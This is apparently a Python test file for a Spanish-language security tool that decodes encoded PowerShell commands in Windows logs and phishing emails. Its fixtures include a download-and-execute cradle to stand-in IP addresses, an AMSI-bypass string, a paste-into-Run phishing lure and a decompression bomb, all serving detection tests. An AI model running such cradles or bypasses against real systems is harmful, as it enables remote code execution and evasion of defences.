"""Decodificación de PowerShell -EncodedCommand: en hallazgos de logs y en el cuerpo de correos."""
import base64
import zlib

import pytest

from backend import phishing, psdecode
from tests.unit.test_negativos import rules, win
from backend.analysis import analyze
from backend.parser import load_events


def enc(text: str) -> str:
    return base64.b64encode(text.encode("utf-16-le")).decode()


CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')"


@pytest.mark.parametrize("flag", ["-e", "-ec", "-en", "-enc", "-EncodedCommand", "-ENCODEDCOMMAND", "-Encoded"])
def test_every_valid_flag_spelling_is_decoded(flag):
    r = psdecode.decode(f"powershell.exe -NoP {flag} {enc(CRADLE)}")
    assert r and r["plausible"] and "DownloadString" in r["decoded"] and r["urls"] == ["http://203.0.113.9/a.ps1"] and r["ips"] == ["203.0.113.9"]


@pytest.mark.parametrize("cmd", ["powershell -File x.ps1", "powershell -encx " + enc("hi there friend"), "powershell -ep bypass -e", "", "dir C:\\"])
def test_other_flags_and_non_commands_are_not_decoded(cmd):
    assert psdecode.decode(cmd) is None


def test_invalid_base64_is_reported_not_crashed():
    r = psdecode.decode("powershell -e AAAAAAAAAAAAAAAAAAAAAAAA")
    assert r and not r["plausible"] and "legible" in r["note"]
    assert psdecode.decode("powershell -e !!!notbase64!!!notbase64!!!") is None


def test_indicators_are_labelled():
    r = psdecode.decode("powershell -enc " + enc("powershell -nop -w hidden -ep bypass; [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); IEX $x"))
    assert any("AMSI" in i for i in r["indicators"]) and any("IEX" in i for i in r["indicators"]) and any("oculta" in i for i in r["indicators"])


def test_one_extra_layer_deflate_is_unpacked():
    c = zlib.compressobj(wbits=-15)
    packed = base64.b64encode(c.compress(b"Write-Host 'x'; iwr http://198.51.100.7/p") + c.flush()).decode()
    r = psdecode.decode("powershell -ec " + enc(f"$s=[Convert]::FromBase64String('{packed}'); IEX (...)"))
    assert "198.51.100.7" in r["inner"] and r["urls"] == ["http://198.51.100.7/p"]


def test_decompression_bomb_is_capped_and_fast():
    c = zlib.compressobj(wbits=-15)
    bomb = base64.b64encode(c.compress(b"A" * 60_000_000) + c.flush()).decode()
    r = psdecode.decode("powershell -enc " + enc(f"$s=[Convert]::FromBase64String('{bomb}')"))
    assert r and len(r["inner"]) <= psdecode.SHOW


def test_oversized_command_is_refused_politely():
    r = psdecode.decode("powershell -enc " + "A" * (psdecode.MAX_B64 + 10))
    assert r and not r["plausible"] and "demasiado grande" in r["note"]


# ---------------------------------------------------------------- en los hallazgos de logs
def _finding(cmd):
    case = win([dict(eid=4688, user="CORP\\ana", desc="process", cmd=cmd)])
    return next(f for f in analyze(*load_events(*case))["findings"] if f["rule"] == "cmd_encoded_ps")


def test_finding_shows_decoded_content_iocs_and_bumps_severity_for_downloads():
    f = _finding(f"powershell.exe -nop -w hidden -enc {enc(CRADLE)}")
    assert f["severity"] == "Crítico" and any("Decodificado" in r for r in f["reasons"])
    assert {"URL/URI", "IP"} <= {i["type"] for i in f["iocs"] if "decodificado" in i["note"]}
    assert f["metrics"]["decodificado"][0]["texto"].startswith("IEX")


def test_harmless_encoded_command_keeps_base_severity():
    f = _finding(f"powershell.exe -enc {enc('Get-Date | Out-File C:\\\\logs\\\\d.txt')}")
    assert f["severity"] == "Alto" and "decodificado" in f["metrics"]


def test_undecodable_encoded_command_still_alerts_without_crashing():
    f = _finding("powershell.exe -enc AAAAAAAAAAAAAAAAAAAAAAAA")
    assert f["severity"] == "Alto" and "decodificado" not in f["metrics"]


# ---------------------------------------------------------------- en el cuerpo de un correo
def eml(body: str) -> bytes:
    return ("From: Soporte <soporte@empresa.com>\nTo: ana@empresa.com\nSubject: Verificacion\nDate: Mon, 02 Nov 2026 09:00:00 +0000\n"
            "Message-ID: <1@empresa.com>\nMIME-Version: 1.0\nContent-Type: text/plain; charset=utf-8\n\n" + body + "\n").encode()


def test_email_body_with_encoded_powershell_is_critical_and_decoded():
    r = phishing.analyze_eml(eml(f"Pulse Win+R, pegue y presione Enter:\npowershell -w hidden -enc {enc(CRADLE)}"))
    assert r["severity"] == "Crítico" and r["ps_decoded"][0]["urls"] == ["http://203.0.113.9/a.ps1"]
    assert any(i["value"] == "http://203.0.113.9/a.ps1" for i in r["iocs"])
    assert any(s["title"].startswith("El cuerpo incluye un comando de PowerShell codificado") for s in r["signals"])


def test_email_body_with_download_pipe_iex_is_clickfix():
    r = phishing.analyze_eml(eml("Pegue esto en Ejecutar:\nirm http://x.test/a | iex"))
    assert r["severity"] == "Crítico" and any("ejecutar un comando" in s["title"] for s in r["signals"])


def test_plain_email_mentioning_powershell_is_quiet():
    r = phishing.analyze_eml(eml("Hola, para el informe usa PowerShell 7 y el módulo de Azure. Saludos."))
    assert r["severity"] == "Bajo" and not r["ps_decoded"]
